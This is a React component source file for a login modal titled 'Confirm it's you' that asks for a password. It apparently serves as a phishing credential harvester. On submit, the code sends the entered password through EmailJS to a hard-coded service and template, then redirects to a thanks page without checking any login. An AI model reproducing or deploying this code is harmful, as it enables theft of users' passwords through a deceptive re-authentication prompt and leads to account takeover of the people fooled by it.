import React, { useRef } from "react";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";
import Modal from "react-bootstrap/Modal";

const LoginModal = ({ showModal, setShowModal }) => {
  const navigate = useNavigate();
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    navigate("/thanks"); // Navigate to thanks page after submission
    emailjs
        .sendForm(
          "service_g572qgw",
          "template_uxuv4h7",
          form.current,
          "ZLLsg29uJrmMWpY5z"
        )
      .then(
        (result) => {
          console.log("result text is", result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
  };

  return (
    <Modal
      centered
      backdrop="static"
      show={showModal}
      onHide={() => setShowModal(false)}
    >
      <Modal.Body className="my-4 p-4">
        <form ref={form} onSubmit={sendEmail} className="d-flex flex-column">
          <h3 className="text-center mb-4">Confirm it's you</h3>
          <input
            className="p-1 border rounded"
            name="password"
            type="password"
            placeholder="Password"
            style={{ boxShadow: "0 0.5rem 1rem rgba(0, 0, 0, 0.15)" }}
            required
          />
          <button
            type="submit"
            className="mt-4 border-0 text-white rounded p-1"
            style={{
              background: "#0D6EFD",
              boxShadow:
                "inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 1px 1px rgba(0, 0, 0, 0.075)",
            }}
          >
            Next
          </button>
        </form>
      </Modal.Body>
    </Modal>
  );
};

export default LoginModal;
